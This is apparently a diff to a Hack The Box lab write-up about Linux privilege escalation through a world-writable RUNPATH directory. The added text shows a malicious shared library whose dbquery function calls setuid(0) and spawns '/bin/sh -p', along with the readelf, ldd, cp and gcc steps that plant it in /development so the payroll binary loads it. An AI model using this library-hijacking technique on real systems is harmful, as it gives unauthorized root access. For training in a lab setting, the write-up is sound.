@@ -18,3 +18,33 @@ libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
 /lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
 ```
 We see a non-standard library named `libshared.so` listed as a dependency for the binary. As stated earlier, it is possible to load shared libraries from custom locations
+We can use following command to see path of that **payroll** library:
+`readelf -d payroll  | grep PATH`
+The configuration allows the loading of libraries from the `/development` folder, which is writable by all users. This misconfiguration can be exploited by placing a malicious library in `/development`
+
+Maliciuos file:
+```bash
+#include<stdio.h>
+#include<stdlib.h>
+
+void dbquery() {
+    printf("Malicious library loaded\n");
+    setuid(0);
+    system("/bin/sh -p");
+}
+```
+Before compiling binary we need to know function name called by library:
+```bash
+htb_student@NIX02:~$ ldd payroll
+
+linux-vdso.so.1 (0x00007ffd22bbc000)
+libshared.so => /development/libshared.so (0x00007f0c13112000)
+/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)
+```
+In that case it is `libshared.so => /development/libshared.so` so we copy binary to path
+`cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so`
+Then we will compile target malicious file to path which is `/development/libshared.so`
+```bash
+gcc src.c -fPIC -shared -o /development/libshared.so
+```
+Then we will execute `payroll`
